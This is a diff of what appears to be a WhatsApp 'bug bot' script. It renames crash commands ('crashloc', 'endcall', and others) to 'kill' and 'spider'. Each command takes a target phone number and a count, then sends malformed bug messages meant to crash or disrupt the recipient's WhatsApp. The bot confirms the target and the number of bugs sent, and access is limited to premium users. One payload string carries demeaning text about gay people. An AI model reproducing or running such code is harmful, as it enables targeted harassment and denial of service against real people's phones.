@@ -5318,12 +5318,9 @@ hmbug(sendto, `𝕾𝖕𝖎𝖉𝖊𝖗😈̸̦̣͛͘ removed gay ♣️_🌈̞�
 reply(mess.bugrespon + `\n❗Detail > \n🧪 Nomor Target : ${sendto} \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
 }
 break
-case 'locmess':
-case 'serlok':
-case 'buglocation':
-case 'crashloc': {
-if (!isPremium) return xgreply(mess.premium)
-if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
+case 'kill':{
+if (!isPremium) return zetsreply(mess.premium)
+if (!text) return zetsreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
 jumlah = q.split(",")[1]
 await locbug(sendto, jumlah,  `💔'҉༑⃟𝕾𝖕𝖎𝖉𝖊𝖗❤️‍🩹`)
@@ -5343,14 +5340,7 @@ break
 case 'vcsbug':
 case 'videocallsexbug':
 case 'callend':
-case 'skedulend':
-case 'skedulpler':
-case 'sprite+insto':
-case 'tahutempe':
-case 'sumenga':
-case 'videocallgey':
-case 'bugmullet':
-case 'endcall': {
+case 'spider': {
 if (!isPremium) return zetsreply(mess.premium)
 if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
 sendto = q.split(",")[0]+"@s.whatsapp.net"
